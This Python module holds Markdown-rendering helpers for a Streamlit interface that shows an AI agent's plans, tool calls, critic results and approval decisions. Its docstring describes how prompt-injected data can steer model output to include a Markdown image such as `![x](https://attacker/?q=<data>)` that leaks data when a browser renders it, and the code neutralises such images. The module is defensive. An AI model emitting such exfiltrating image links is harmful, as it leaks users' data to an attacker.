"""Pure rendering helpers for the Streamlit UI (no Streamlit import, so tests can load them).

Everything shown with ``st.markdown`` / ``st.error`` / ``st.success`` is Markdown, and much of it
is untrusted: tool output summaries are raw dataset values, and plans, critic issues and the
report are model text that prompt-injected data can steer. A Markdown image is fetched by the
viewer's browser as soon as it renders, so ``![x](https://attacker/?q=<data>)`` would leak data
without a click. :func:`safe_md` makes every image inert; links still need a deliberate click.
"""

from __future__ import annotations

import json
import re

# Inline images ``![alt](url)``. The report's own chart references are dropped (charts are
# fetched server-side and shown separately); anything image-like left over is neutralised.
IMAGE_MD = re.compile(r"!\[[^\]]*\]\([^)]*\)")


def safe_md(text: object) -> str:
    """Markdown with every image (inline, reference-style or nested) turned into plain text."""
    return str(text).replace("![", "!\\[")


def report_markdown(report: str) -> str:
    return safe_md(IMAGE_MD.sub("", report))


def code_span(text: object) -> str:
    """Untrusted text as an inline code span (backticks in the text cannot close it)."""
    return "`" + str(text).replace("`", "'") + "`"


def describe(event: str, d: dict) -> str | None:
    """One human-readable, image-free Markdown line per agent step (``None`` = don't show)."""
    line = _describe(event, d)
    return None if line is None else safe_md(line)


def _describe(event: str, d: dict) -> str | None:
    if event == "plan":
        return f"🧭 **Plan** — {d.get('plan', '')}"
    if event == "tool_call":
        args = d.get("input") or {}
        detail = args.get("query") or args.get("code") or json.dumps(args)[:200]
        return f"🔧 **{d.get('name')}**\n```\n{str(detail)[:600]}\n```"
    if event == "tool_result":
        icon = "✅" if d.get("ok", True) else "⚠️"
        return f"{icon} {d.get('name')} → {d.get('summary', '')}"
    if event == "critic":
        verdict = d.get("verdict", "?")
        issues = "; ".join(map(str, d.get("issues") or []))
        return f"🧐 **Critic: {verdict}**" + (f" — {issues}" if issues else "")
    if event == "stop":
        return f"⏹️ **Stopped ({d.get('status')})** — {d.get('detail', '')}"
    if event == "error":
        return f"❌ {d.get('message')}"
    if event == "route":
        fallback = " (router fallback)" if d.get("source") == "fallback" else ""
        return f"🧭 **Routed to {d.get('tier')}** → `{d.get('model')}`{fallback}"
    if event == "escalation":
        return (
            f"⬆️ **Escalated {d.get('from_tier')} → {d.get('to_tier')}** "
            f"(`{d.get('to_model')}`, {d.get('trigger')})"
        )
    if event == "semantic_retrieval":
        names = ", ".join(f"`{m}`" for m in d.get("metrics") or []) or "none"
        return f"📚 **Metric definitions** — {names}"
    if event == "approval_required":
        return f"✋ **Approval required** — {d.get('summary', '')}"
    if event == "approval_decision":
        icon = "👍" if d.get("approved") else "🚫"
        note = f" — {d['note']}" if d.get("note") else ""
        verdict = "approved" if d.get("approved") else "denied"
        return f"{icon} {d.get('tool')} {verdict} ({d.get('decided_by')}){note}"
    return None
